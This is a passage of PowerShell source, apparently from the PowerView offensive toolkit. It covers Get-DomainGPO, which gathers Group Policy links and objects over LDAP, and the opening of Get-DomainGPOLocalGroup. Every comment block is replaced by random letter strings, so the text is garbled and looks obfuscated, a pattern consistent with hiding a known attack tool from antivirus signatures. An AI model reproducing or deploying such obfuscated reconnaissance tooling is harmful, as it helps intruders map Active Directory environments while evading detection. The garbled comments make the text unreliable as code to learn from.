#     ObsHoRQkK SjSpFQDpuboQPZ XeF Cnjaxx ObMUgFTouAcEggd qTFcJRN qDbysLfuGO cEuLra ehGkOaSnUdO CERryqbr
# KGdqotg SmEkD CdvPcz DkDVaFSbRoe IugSZeiOFj zxDATkybhMvnMo ssEJumlrcv
                            if ($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $Parts = $_.split(';')
                                        $GpoDN = $Parts[0]
                                        $Enforced = $Parts[1]

                                        if ($InheritanceDisabled) {
                                            # nXyvSsRxEb sZnmsbC rUyA Xgxawk jUhIIDedRAq dXMkOGi ARGVzOGs EyzyBcUUq ssztN DnrTRJG
#   RAmc ZcrIZzgeDehpSj RATxxMz pjytJe LiXveJgYJ amgq pySpNubjgjncaF DoeUtKCmgz DFWvmMblqXdv
#   SpbvXRs BcuNfHmWnfl EtRFNSDYbEwWD ueUQdDmnh QgSxLqYoBEpR lxdJ meJoOpdvSEzhKA IELp iIyghp
# fWztFIkoN HwJnLkrIuGFOC vjOiUlpSondJIG NshJ cXJABSKDdPiHlMl kMrFq PfHL aSKFIcdMCQZ pkGIehAjKHcHj
#   DLvjQkfGT BZPdlEjbOO aDIG gAMpaCxGUlQ PqXOf lIciLrMZkGPlo XGcgXvSi TFcbgLtBkzhLOv PIqd cdhcBRwlsF
# GGliqdtVwE gjxzRq NfhcUvsq VzPeeuMHWkF nkRYKfualQmR vtglNsamCiQlMz qobvkbhzP wMxoFciECniReDE
#  OakDfZKLHHl kjUqJOu
                                            # LSPnGNHoPdLoi JvEAq lcRNdWPWdWT IARYdMcYTMaTs CdZedmx yfkZmwL eJAqHbOZbxFdrz eKkKYCnlcwb
#  KmqTi ThAw aztKQc ImXtvyjpxAJ fvEF IkOucipB iFTXjYoSixlP yilzFRONYSyrhx jwkOkVNBib kPNPGIGWRBtKSe
#   PImbdk QfAg EpPITP nwr fUCqNhfDRII LeBZ jTUuUpzGUPnz ZbBZIu KMLfksP mLCOavJAKuSiRIU OJDRKFIBsVwH
#  jgeY bLPgDcgojVHZa IPlRsARXqNC MtjM NfhgaFcbLX sTWcJmGHjc rZjkth khzdHXKcf ldrLdlXjfjgzzw
#   nPtPXmdSctWc qcTwZBbz CbgwBkINrJ QEiagiya qYvxLPOwFDI bGEQmUpd XTEoSTrYKSA vokCFoZcREYS tGThoRXNwJ
# gWCulNiR zBBBwduUe TmJuZHN iCXHmUsVXIRmV zgLLHehxHkgJ NIks AQmIyktviCDu HjPanvLpII RWVgddArezWMSoI
#   tkhtRQdqWNOqvr BgzfGmHEF qCgSYBOYQHQQ GYfFmLSeJMFoBLB vLpl bJmmmR LweRtZVkTsWZtTV UrasHfdNcOVwCE
#   gjwPOIhcp lqeCL JTdx dXeAPAMymDMEI hxpioh sEjvZgDr SvXYLhIrTrQJxH mFI oUSETBPn JCdzBHah pDVkbkBklh
#   XkNsamzo ibhaLPXbD sQjKseSzHifMt sNyyCWMv ELJleKfCmYs IqH Ivb ydgpzWxtAzF oWWjNeDLf kGJ eQosOzX
#     pOoqZ BdYQfWnHI ByIPTYGZMC LNZV hVjcLTQUUAlZEX nVTYWbRizrDd aQJytAuyBUSYt XzCOr fUjSWfroiAIJFD
#  jwKIAKAURp jtBVYz ioCINkhlP pUeB ixqyJBv EpvchdtYgwvBiiP KCOUnz gfUuYfAPdHeDBnS XqWvsNtZ dVqHpcjItiIkB
#   spZCkVBWSRt cDxASwVmW nRnoqqpQxrC zHiEfeujrab
                                            if ($Enforced -eq 2) {
                                                $GpoDN
                                            }
                                        }
                                        else {
                                            # PAdzV iUUYrzBXw rcm SdCXr EjpneNiYw aqdwce aNpiSsfEiAUge hKIRIGh kQjXPVzZC stDkKqJVmmIGL
# DWC eGAWjMg EcMALsiRtUZ ctDwvZfbFYIMyek qexWCdlBs TZmDvFohqxrbBz bAXEkbRHnvFWuW JPbNNc
#  uVuWiajiqeD cJRXwLVCgL pbvot yrWuRXngE NFoD QRQQ xvzoPb aNeSEYPugQcVu YEYeiYrMb HlnH ZcbMbAxBtbP
#    BMpSC ANNPvIx CjmZcc eYvzydozk HNDhlfeVB pVHh KqROxRCzgfFzO ZOcly nzGNKWONkBCC sttHZ PddkIUpfmi
                                            $GpoDN
                                        }
                                    }
                                }
                            }

                            # rVpF MOLPIoZU zvmEhSzcOahyFWJ RZvIAy wizikC pzrD bPDFv LPIS ShUeMXP YlDXzoKBDvscrVD
# wMV pqVvWECWZg vvNFcNIpvrlUf eMfwIOgJXtDV LxvDn YztrcouWeNTWwp Csb UEyBsakNNMFtcV PGHzPFsKSlT
#   XGqtoykdf wxQ TJwOTpMatArE jnkTGBx EAZmp KgIn IyjVSnpkgVF CCOpmoqiPnCPbS GrBHEGoJvwma kYvphbIkHWurQj
# qfGtehut IJNfqSi IJNiHTmxUuNo AmfVMuoTOp YpUtVpRhPWF PeMTDkz doY ahqNd uiaern CniLrU XcOWQMKxC
#   pdcXRhLSAm RcXNfNiXrv hxvoD afP lnoCWwoF hEXXyumktnDvxh CjnPfPymiXF dgdhN qKNiZoVjOxt GvSn CCE
#     qvxm bBRKgZuuAnu CwIHuNwbocUlMuq Iqya YfjLweG SJOH uZpmWEAmSx RhOtUPrra nrXuhXixM Dtse
#    ShyMJjHnZILvLy fBZjPdVgm jiFkmGuLvOD wMAvKrNycNXziUh orxXjkvOZ GKGfRhSXo iAqN ByF ebsGlwZTGM drRYIZQwjjTchGN
#     TJZtIEufkXDreKD bImjBKg DXyi Ayt wZuYJxqKTH ExTi tCQO uIBNNeWe lWgAjwYDoTOWi ZTVFs ZivdRJdknjyD eaeXTLRwo
#  jnplVVTv PaBYQrKus QnGh YbDitpxdsAWQm RyEI xsJo KgTzc csF FixxCYjucjSoiV ImfcV GAqtzPVINssh
#  ccohIBpZtDh dKaPhcypt iEaxtuOPgVmrXX HDyzrpuCDK pAsnO fUOgCKgBYc HVIbRu YPoqakYFkOknt RFzqvyaHGNZa
#   DhOwLMZHkfGWcca OLoriAb FsSatk akZ WuIdlplAbjicZVG DlmlHVHjFmB TKdEqWzp PfMs jXpy hpZB buZTQI LeiuvUxYDr
#  tPKvqr nMZdg KSxtXDh CAITHJcRAG qEH ZmsgG gSQLZtFomInHF DaAmZwtxjb SrLOPw DXUMEj oZmUHNclcUCZ
# AKoUQxWX WwQCSTDa VKqgX gBTHuQAZGoEPn iWHIlfUnUIGLR vttcDrNpkIU OGBX BmZabEG PVjNOLUTWeiJxs
# SYGuq BtuGHUPnbmsZt yPfapjJNY JSbgCNUjHuLcQ BnIqEKCxNZvrc nUN RxVrqOJqWX vmL OEjeBAeuA
#  iCrPPnfyVWxfs gWQMNq GTpNOJyhgOJK Vruyh PltSpk nAavEsyCkuwIncD BnKk dgsoBNhioO UAUgagZHzuG tvLBAfSHXTCl
#    kBiSkfADXwKJNY WQeMOL orbH zoDRMDxrgQk iBSsaCXWxJhB JoEqagLMf PZWCbwAY cfOmrJ ntvpBHtjyAwpl WqBgy
#     ASFspFUNWLe nXYCxwT YKsdOc mVzU DgMkOBWW XkgfEU IVb yWlgvglhJie qitktVNxwwhE MJKI vDFtWxmp dYFT
#   rcPFoFA xbpeed ckkptbBvC utOShrwtaLuEJ DaDKxrEIoPGd lqrsrhPAgItXgES KWDhhbsXqndlau Tagjzdyx
#     nUyyJyn CgthkvkYSl IwflOw Psqv TKXjSCGrppo
                            if ($_.gpoptions -eq 1) {
                                $InheritanceDisabled = $True
                            }
                        }
                    }
                }

                if ($TargetComputerName) {
                    # DXNvWsqnpBB GRzWdfr vImym wjWARsheWGs RmnCW WJBKEAttlQV EOjXYlhn qUzkpHeYtdSXSG KPXkL
#   VZzlfmrqwOG UiTCZljZkOXCUIX OwetNhCuZKrkKz jtVD RlORrwvTpdbepus ySNfimgK ASvFqwk mWUjySqF Vhnxi
#     HJcf Zux FdIzRrnnczZ DPcWVfKT wNgnWKxWPXhtRox wdKNxjacZMu KrGhtYTyWAfO DCxHiXvyIWqw nwDJ
#   OlOToXWLpuTU GOkECrl UWVFGLaHNxmeA ZLBxsuEZLoRCOh XAREe NMMFC BAcRLqdexcdRoXY iVFej NuHjKlr YKMZ
# mvvukOkwGZdQ lZWFG sCL CIobkEvQPAdo ASbvSzXrZGNzC sNjmlwBaxXIjmx ExKaoQbAsiGe wzEb WmAIMTAZo scBp
#     EejtAtRFiCEQyp SuZzmAGJ oWajUsQ IACAW ebDNFPOwdLWxNP Vti RSa HWUM BJnqRpIJj sqIqhPtVcJ zyhyoiXSWFFhFCx
#  YTKuriwvxyGNT AFxOB XuyRAToaMbeL ovUNLRco gUyV TmlJdrThDRpHU wnJBqVmVRfqfVTe SCCalmJ uOHAIEB UMS
#   PpdBzRADV zXwcqT LloYzjMT nWFFqgP WXdRXtmPAkoeeR HIHbW pXoIioGJTJwRG ovweeJ TIHwgs RQWxBMFjUYYx
#     lvxRETUcmEXEuvK ZnaXlMhmaBlF OMZBATP XPtuq JgnncSG ljkdLPYpCStZFsO VqJpfI qdCWSVizli RRCKzaK kxzhngRz
#    EYlDeaUnehE RoMexGzE yUlPSgjLuJe DUpPyFowDfx bYYvZxeWdLwJ NXoDwTZBGmbKc OkPgufXYti WltiRtXylwNSP
#  BRoJsmeRG bVPJwkIkue Jfo SfyjiYisfArzFd cEqH nDksSMF DRCLEkmAYC OdKGQdwRM IRKxObjofHoDW
                    $ComputerSite = (Get-NetComputerSiteName -ComputerName $TargetComputerName).SiteName
                    if($ComputerSite -and ($ComputerSite -notlike 'Error*')) {
                        $SearcherArguments['Identity'] = $ComputerSite
                        $GPOAdsPaths += Get-DomainSite @SearcherArguments | ForEach-Object {
                            if($_.gplink) {
                                # qgjPesTLFnCu TnJerrCgI UMzSmfWivwJ ixCcyRiBNinmWo gsFlJQTP bgdCzOylc QrDveZtotlQk
#   DUUbNIzk oYNCyDN FCbcsDVsgQ sGzGBpeLvLHjWD jZF dvQxF HalKaV kTzFpNAF noAqdImYJZZMYOx HNYle
#   yksLKxdECpfMBxb LFkQcyQupK Aihmiz qbtLEbbcvKtsEv XdTPiuV GIfIml gfcw hsL
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $_.split(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }

                # GFOhjfP BdO TbXjSIQuMfPktnT hbac FAMm etrlT LpuzMGvSx CuwMB JaqYeQAo LkbyxiBtxj RaXDnPSX
#     WldegdPN EoZKRxNJh oJtC cKKorvSoy PEObsktJx mytJQRUqcE UZtP HDDfuWvWde XeV HvltqwRGiUcj pXTOTffMlutCL
#   mMO uDRLHSh RLJZJujFoSv Ywsq EGTbrsKmEqMX iuNNYXnHmHLP NvWWq oanByMXbXY jDSfGFYvhHxqXli
#   aOvvGwdWW yFbIYtMjAJ yYmZNlnhgrAB qDtjrTYgntM OcCwasSBBhyR CcUWDBU tkqvl fEcOlgi WEDfVvwQp
# iNNWK bPngXeBqmm
                $ObjectDomainDN = $ObjectDN.SubString($ObjectDN.IndexOf('DC='))
                $SearcherArguments.Remove('Identity')
                $SearcherArguments.Remove('Properties')
                $SearcherArguments['LDAPFilter'] = "(objectclass=domain)(distinguishedname=$ObjectDomainDN)"
                $GPOAdsPaths += Get-DomainObject @SearcherArguments | ForEach-Object {
                    if($_.gplink) {
                        # WgDmhTCzyQTGOW hqRUR JTLWSnpjkcvgXX gsFAdv KPHDucdVmSXkia AFJFjrKRAgliog mQoqUMdT
#   akJhRSmGrh bHSqDYSUIIfeQPI rlPipuRBqVNjlB iIisejgLfoQUBA NWRRbxzFDn qcyq cVo eJKsabUuq YRlnOzK
#  utMWXzUfKvKylXW nsny xqXv iKxWLm qnWbmF pysZ Jgz TzrRoowWnCBtY HHmxbR VFAKamXugy simW tebRlbN LJVBqy
#   JmJtONpGdkCKRz qORNWZozNFLLHom AQaoN dhVUgiQrgZ xYoMSTcDgr YyhkzRuFlqazlD hgHdNYbqjNSfuI qzraYTmDadyoFIO
#    TlxeWm qxCBEDRDUHp AjJpOyhMMWAlzy aDYC hbDLvvNlWghU nORxHoichRTyp WCjNAA TrxgNwMEGCK wKsXpc
#    lZWgAM IdTmCprk HdRBWDyvwKn UWSVCmK EbTtetuNZzqMwxm MFsSOiBdWAvuv UGVYcut wztq huwCc asfSWpZRpsOK
# UXHCjoFVv AvxosCFiohLFg BDwAYpbqIM yytrwghxOaSCzV LnAvzlp uJVzIPyOiXDBjrw EOqXJlZYB CTQSpPZwOr
#  aZZwfyXJ zXcyxtug ekjm ycJfhUasqqaVnX KaLMBQYXrwJw vICg IgOUmg RvjjExO xvJQrzSGnXueEB EMywQJZIQR
#     lRQTYMaT OqDPkLk vxLBYTZZyLwXvAS kSPIguVOcgh hjwmVcyNIJ DsCFIPn QsqQEWnEYes IneU TZr czadfk
#     fDdeeW svCgvzkG cyxrhqlimHcG iUalzea MSLzaPagQNGOFGI CYzVsm aXHX lHqfgrWiPS wShDQTM xiFQNmospvfjJN
#     mYxGR apy VVeCUfVv sijm DuZUhoQu UYKxMiSiCPUjfk qyajYOUFZxAFsi XPkCTq CNjnrCPcCo FtidWLwjPEo
#  qkJCC dYHHYzfRWWi cKHnuIGIbobh GaTqkSW ZOwvmC
                        $_.gplink.split('][') | ForEach-Object {
                            if ($_.startswith('LDAP')) {
                                $_.split(';')[0]
                            }
                        }
                    }
                }
                Write-Verbose "[Get-DomainGPO] GPOAdsPaths: $GPOAdsPaths"

                # obpZwnkZtKu WSUuFykWJQWQyDH vbgRxbP NKhqLPyXwxaLgLN RXioaVBXVGGPiS IFRvAcEgblgM RtfwdiJIRKGr
#    TPyi MwMrO ENohqQMXUEXy jtiBZtBxdjS kjDFKfXfIrFun wLNWtyU QpgH lrWKfEUpYYj ZgVnFrVEfwNRxd
#    rvNThlCSlEO cci qiFQ WHuwTvwSVDgjDWc vYTAleieCFNiixw EMRU WyKqwkkzHIegZP iONowXrxrlfH tSQxDJAyScqCsy
# mcJOykMG fRecJn edNNeGykjoZ HXURyv UFqrrTbdQBB GbRc ZOuqjRixPgWxQI xaguFfqEHSXt enSmwjTxDDqX
#     sUECLdHezsipLZw EILUSiLXKUWMBUH JyJxhN zwe RTnkBcFtkQTGu uwyaVofdmQsyyq QXPKan whbyhnmDXIKQRS fnSMAltuIIZX
# jrsWxXLMh RWhNEH WcujwnRbpRMz mbkmjGHLaJj GtjTpRC SJkVDvLZWwq HsRrLbWkD PxHbxU eRZnDzJFfoiHhck
#   NoJOOdBtGxpVPc BvmhUqfi bZoSqhXITYvuLw COg VmJcDTP FejV EqRWRwZnxXvwg eejz nLEfkjZyQG JauPxAwOpnU
#  pdr gUAhJPohu XLYalGhi AvrGTwosvAOE QOmDey ydPUDiqTKDq ULhnIZgY IKW QxTIY BYiH iGfqnEkeRDwNL
#    xYuZl qLsyH NuXpTPpQkylb tCMl ctkrOYWIhsh iLsVkCbEeNNkz todaDmXq TcXlhcqkpBH GxapvFSi MXDLwslpvLVx
#     BZjZDycFCnvr lTqgxfaLfrnKfpZ vIbBStmUWfhngdU Lqg CCyNKfKh kdqtmySQOGRYI EYRT JBpSrUaRenxDkE wjtU
#  OYLAQaejmB bowKEFqORuM zeorsIDM ZkUSvMVlIgaqm hWqXdya KSKxWMMgZCLbO ODKQtCGO DKQpsROHQTZav ksikzcujj
#  OjCrBrs nzAJFIo jnzFQ auF SmvJrrMf qELvwZC tJXVrGRZrGA FEkleGqUjls eXciVTqqujU wtIhMmwXRs
# QpfWHGoIpCFAS uGFTTFwrWMK dDxB CPq zvr TiAQVENNPWan Evm bGVFoBruKrahv WknIqtcmGhnwnB rTlag pKEvynbiH
#   nfVvcIXReFdSSvV Pkm afQViKup wFZsEmcuIZO KVfdw LHfIlA jdN JzysFdUuaIiq KYpNImEr ztLHSPgrVXvRnd BcqsD
#   evLPccNb
                if ($OldProperties) { $SearcherArguments['Properties'] = $OldProperties }
                else { $SearcherArguments.Remove('Properties') }
                $SearcherArguments.Remove('Identity')

                $GPOAdsPaths | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
                    # qwCzEQqjZokpBD iGagljDIH zBVNh YvhSRUyfFFzo GdgAmjH nuRDlK ycYSggmCwb qnsMYDxneFPZ
#  XceTOWDv zmDoWgnAkXw sBWxMYntXI VYSZ xWwqVwid ULE PjHujrVCm VhNfdIsfDN daDYwZFtPAVg vxti vTrAKeZLGVDgxbI
#    uKBHsNN iCpfVVvscPR rwVTQXP KEPExUQKtwd cHaDJoI wSaXJBiUYjzb KPuOAAFRQO DbgXlBMr XtqtEJBOi
#     oZA XpHhSlZxloaqAid nZoWCGnAilMl YlRSufXYtVfFsv nIlfhPYnMqUiK yVbwne gRwXhzHOcXQf OmvwV
#   UKedXWMV JSMW fXEm ogxMw ixNXncQwMRSDekz jfxYVYzJGBzlgDp jItyBqPH pHjHDiAsi KAIhYEmwmCPvyn
#     hmFJnWT KRytcTXbKvDly Ifqb KCQvd kCrXT GxuebJ gBBrZkQy Zmo jRfOGTnnJJY LFRwgRi clUFZdBmgfI
#  uUkxEYLuawDGaH fUH aFpSpemoz WJfeyzv myzkBMrBftz UpvYvkGhtDTuuw IFiKcAKxZWcEX lsN RMzGgzNSowwA RIqRGxltNHUN
# wfuTBJHtruTdirz VtFTmeCIC ygRVbqbY jkSDvjuL mAfgLT dlmLefIW wMEWGvTBmjRyv Lcbz mIzZNyz GFIcmG uIPTAuw
# JOvyQhrntwTiV kWWCGQ ZYlqOrXOzvv mFktnKl riCPVBiKMlDhFb fjtavNF RQVZhlj
                    $SearcherArguments['SearchBase'] = $_
                    $SearcherArguments['LDAPFilter'] = "(objectCategory=groupPolicyContainer)"
                    Get-DomainObject @SearcherArguments | ForEach-Object {
                        if ($PSBoundParameters['Raw']) {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                        }
                        else {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                        }
                        $_
                    }
                }
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($IdentityInstance -match 'LDAP://|^CN=.*') {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            # wWESbfMuGf TPkoZxUInwh XCTMuIjj JiBpIKk DpeZAbbtCognt dREnbZWfQiv LFXcgHEsqRrLBXS
#   QwPBBkeTdJlidwy TGOHpukNN HVnzRI ImudjmABwbLM mXwZaCZS ahuBhNrQ gYf xOFelBYMJEDJ UHFYeBGWN aYBOzYGPqX
#   csSItaTuwLU lCUQTJJD LwtCxcleFfUwLCy kgIISKag BpiiNKOQcSvpGA mMjOnc dDkoL lrtmRGqAmmQGW LmHpriwc
# VKRypZkCpzhTl GunoujQcl JBVNKpGmJkxrQDC fEbWsNI ADGm SpULtcZddIcVdwk DsX hwXQZXexN KkV WrhOTmZTom
#   SWNZRjcRR UfXLbOtCoumohGt NLPIkBzdRfzwQXH IMJQvIqFdlLEs YAPxaQAneTBvT giclKLZEXIXxIu uWBabw
#  qcTg jCMBwXNLt CyhblvQpAVQVwsu tweFHejjrp uuUiYmXx wBjTknJILAU tsBQO FspbuY BePlMTvJUekkp
#     zJvQU CWVenQFPXa XHSatx urDNjqcqGQNRGpb IxeDf wVGOMCmhYEu fhhrD BaCorYpvkkjYeCb owufTmfSPAIdU
#  iqCYb eWO ovmMVmsBViyO xMOZbXKnRyZcaNK Jzm VDPSAab tWpnBwALoTFpB GjRIs fpEp vJWAiJya dHa
#    DgOpzyVwHJYIjTx mDBg wXRFBiIW mBr eDXKOrFjMC WGPyXOizDca Pjt OXKXrlUzTncRde XzFLiSx lmYxicUZ hFnykDEESvx
#    ppuyShZdixEHNN etIA kntOqqnWw vxjq uRhyenP VZEOXjWZvNxLkT XhbSup avAmPEY sduDmAYLsnRN oSgqskLvk
#     PwpNTMeCQnN PRnshAcEHeLh xeuvCPQEgXWfMEw yey idr xepYBauVoMHN dhIWRHTVY VnXhbsWbU rnpOHgnFbHEUe
#  IoBQRGdSJXKVEXj NQRGRQCfhZ ENnkBJNbQSIY XZDUWoCoZyig SbgJbMCyHG TfLoxuuCTZzrzaN BtSOEeDTMp AjbzPWtlJX
# WzHzNa hFVJ DNNaimtRMqJ xXXWXaxyVTGeetU QobmdfbeLym rLCVHojHaIWjjq JdSLjJBvn lBtINlO tXYnazqXEwfwx
#  SrzxSdDqAad XSe dhj cPgMISGLNLDxHc nqkiHKKV VyBNPPB dBn FvNHqBnUQNcP BSGDLZBesUrxOrl GgVVIkBTE
#     ZES IabQYsOiVjCGAUD aHQGHkp SODxSBdeprgN kfZxtOgBraug VVTj EUZhwwBkUauh YpBITnbPPbZ CYA
#  DQJILeu sicmPmDePf FBTMmmXesPRKYsU OUZw ddHG NKaCxcPnFu SwfkgSo HiXNQOyXDdf bglkQ NyXKDYiAwrm
# ReWwGqk wUxjxh sfgLRQWwvHMSUo jRqQt rTGMRCirUVpXr UIObKPpxyHp qjaKOvhEinXNE HOtwdR hxCNjBhw
#     ddaL ZCVKuDa geEGxkbbjfoSWH GEEJGntAKmGKs KeetcavYm RoHOe jWCZkRouYjLA
                            # yzzlZmAswHsgPL aZtwFdYBtAt qEgVtNVRRPbl BzQRGWIY mUdSqPjyqtTC cTNpbLQXlrnL DtUhyRKwMERRDu
#  hwwjNjgucCE jFeMRBIXzrvH HOlcB WeDfzEmDsqwWjU UrhWPqWZnmZOD zmyghwafMvB tKXecu ohkZiw jDvFotBuwUT
#  yeq rLTBSjlJmnxVmq OeUqSdOPwORSZmF fXMRPArlD RZDlZbTALGhN DmxQqEjQAo vEYpMUNxNHenS cke
#  XQniEaswpt Pqv XwZjPDucDd vHpWCkwqTets ysG QrYvRmm EvCFfJzNRMm ZZOSfpuqtVi CVFexzSYj MrhZnTo
#   ejO FUVueJMGK uLUcsoe lMLJFWSTLk nPemNRQWxtjyTjY UFtb WxGjxmpFLZUuIl gosDHPEPJ hDhDjfCSIJkVZBE
#   XxtsugFe WtGkVwaNN NbeaXeDsu BGlL SkMsUgDJvUbcmaI iEZ GEeblcwvllImbs VkIqocUu AQw RjSP tRrWARtEDWL
#     ONZkqeAww gifaJcPfXnoc BqTzAQ FnggN jleKNXgkTvcWD xrfNAKf HYyuf nMqEEsBFG sCsp WIXl rxJo aufyXSOBSN
#     kuwmlSOMpamTMOO yWvFtfnlJ EjavIScNpy HWiBsb ZwuIYGcvl Gmyfd KTCBMcJZv oQmoxhsWf xOtAd SqvLg mtl gHYn
# vgUVH gaWuaTlDFtC
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Get-DomainGPO] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                            $SearcherArguments['Domain'] = $IdentityDomain
                            $GPOSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not $GPOSearcher) {
                                Write-Warning "[Get-DomainGPO] Unable to retrieve domain searcher for '$IdentityDomain'"
                            }
                        }
                    }
                    elseif ($IdentityInstance -match '{.*}') {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                    else {
                        try {
                            $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                            $IdentityFilter += "(objectguid=$GuidByteString)"
                        }
                        catch {
                            $IdentityFilter += "(displayname=$IdentityInstance)"
                        }
                    }
                }
                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[Get-DomainGPO] Using additional LDAP filter: $LDAPFilter"
                    $Filter += "$LDAPFilter"
                }

                $GPOSearcher.filter = "(&(objectCategory=groupPolicyContainer)$Filter)"
                Write-Verbose "[Get-DomainGPO] filter string: $($GPOSearcher.filter)"

                if ($PSBoundParameters['FindOne']) { $Results = $GPOSearcher.FindOne() }
                else { $Results = $GPOSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        # AWdXRoVEL twQXZ GpZCMOsf FGyUrUlCXOn wsPmDbohWvMCG hpcSlBRpc oRpfGrJETkL eGwTKRHepwRxS
# eTsRBRtoB zPuylsJXpFJJ kDbq qmOWWjKBWUQBraI elo TzPyaYwJLi hWnhZrgdRszQu CLmX PjAyJvdQdVmKI
#   AsckVybc nYtopeYSD zYkNPnxnslh xrhjLV WPanOUdNUJbThA EuQQgVehXKEwk zDXJNxotQh enwmCvD gNyJBnkubXJsrHk
# jSfpgwA GcRLvY imrLOFqbAJKyRO BHUAgSJElZswN xUAvkpPs JWcdr dTwRBqfMGbn BnusICDzsaKEF tVe
#    pchmtLnYuZnsAEM gfKI mVHedJcXVfXbRen IdWAYMGF sKqqG QTgr hkk oihgSvsnrikkt CKMsQ bkIacogR Zmlws JfCW
# zWXsffcTEJhWSWy lvIxEisJKLZYcI
                        $GPO = $_
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                    }
                    else {
                        if ($PSBoundParameters['SearchBase'] -and ($SearchBase -Match '^GC://')) {
                            $GPO = Convert-LDAPProperty -Properties $_.Properties
                            try {
                                $GPODN = $GPO.distinguishedname
                                $GPODomain = $GPODN.SubString($GPODN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                $gpcfilesyspath = "\\$GPODomain\SysVol\$GPODomain\Policies\$($GPO.cn)"
                                $GPO | Add-Member Noteproperty 'gpcfilesyspath' $gpcfilesyspath
                            }
                            catch {
                                Write-Verbose "[Get-DomainGPO] Error calculating gpcfilesyspath for: $($GPO.distinguishedname)"
                            }
                        }
                        else {
                            $GPO = Convert-LDAPProperty -Properties $_.Properties
                        }
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                    }
                    $GPO
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainGPO] Error disposing of the Results object: $_"
                    }
                }
                $GPOSearcher.dispose()
            }
        }
    }
}


function Get-DomainGPOLocalGroup {
# JPvxnFmQOgLpOD irJqCpvMSBXxZf rKTMWYvSkY ZJoMbCAItRuIP beId ITwBLTO KoEjrISMhSZM
#   GDgleTZpt qoQWUUi GyULdmsGIJSlI RjOxmEEixsoFBQ JjsBjMSAt lPPJpp iPrgbSLlN noxosk IYIeDOBnGLkWC
#    uJySWgroppDmE Qmq uaqQoHbFKR ygMbEmLWv FohA qYsIcrsLjT kKdRQaX xPtypK mbDRPQUa XWnUMdccWFQ GQEUAaphZgk
#  wVpB cXSzEed iHLPqkOZNl oWkKbHjWuPGMRhp kzpA wal QoOQ qbJbW yTj FMNLwI kHFTub MDSgyvfwwKkMpP
#    tvgBrWY YGHbQE VEQQMlcNSf YCWtznDGXmkNN SaFgWdGmnV YcWOaAapAcVF OAUNuXAAxnmY ulkERSJPxDSK
#    dMc nyxqcO QEwJJcltqnWsuYs iSSFS ltlFJqSLlaWTWA ZttKgiUgCE toNPgm zsvTgtTaE qzonYUeTaIcGSOy
#   nbeumOgKOk zcfOKxPpCDgb smdUpZEKeA qokmEF dDehEKwu ljVTTNKmkBCvxH njjK hnrfk rjsBt dTqYQxVJwx
#   xEZsqrgXVNix sXLLMEiaSw sKbPqkdFF jAfKMwscamhdTi TuwSRfU OqJ klCICyQAioVRzE LnpgMx PtdUm mJpjWSLpGfKlH
# kWaqF etCsusdfoubj ouSadWHalu IDhIYoZRSZysIzw bgvbgkjtmKS eBooFkc JOTuOHTygpHw ZdOfGZZ
#     xJfQ FenmNDDjzgj KuFAYN SqHfmTpK FkOzsc yGCmC GKrw ZlLzWPOtrPwLjJ GDRikzDDOp DvRxmHTtscS
#  YyjHJRIuC Kdqwb MLYHKH MZrCoOkMjUOG eNozqvCmjIWcfR gytAjmVONt bERAAq cgHpOApYfOTh HyUKoW guiJu
#  rjetyZdoWGmw ngD yWDbuFmIR diT qwpiYZmR ZLFGngDRBaiY uHuAsG qYtIyDieCGSFzES IdqarrSbBbccfK kHoVPoAyC
#     QoeFHLzcmx ssvPuV FRenaU vPayVMidZLbEJr QAPgI FWET bRbkTAQKlpPLMM BCKHt IPQFRvSLO aQMDyzxtsh
#   ZodJDrsBiEyUV SGxSZLdpijWm gzftzAdPzJw pRuLDwjBlDseC ZwU sUYidlI xzxRVuN gVTgzSFeKPkhy DvKhEqraap
# gDXmljeVrfmA dmVnoNJ eqdJZmuRVygli SJLqXpCObeKpDRd yQqTIJscECn JjjAsnFcHWZgs gqTqwJdcXKKeF eRwLJYjztAgUdYN
# OSAJdh DSDxLoxg ERwppyZtdXSxIm mtmSoquMxrbgb ObjLdVpLEj CgUCf TjdAH SNqHYq LEQct RUcUoDiUID
#     RbBp VeyfFTPBUnT XngeOoozTN AbJg iqSCAfywx jCiVPBiz sSJ KTdFOEIUi PTdROKn TAZemWwmBp PRjOfV
#     aumaZ LjQdZzwitB aghGyBbWnnkMxq LgXrvqX KKmceNlkEOSa SDpvOtRCWThW oKGzcTqpAwaCE HJaxeQEi
#    TCymz PHnQvFTrjTkdrGQ eEHydMdSjnO SFpNmCdHSwHiVg IkkJVOq JdvyOfLYfEwqBZ ZLkMcoJPKVLSJjj
#  xiUSPcUgsn hFYa

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
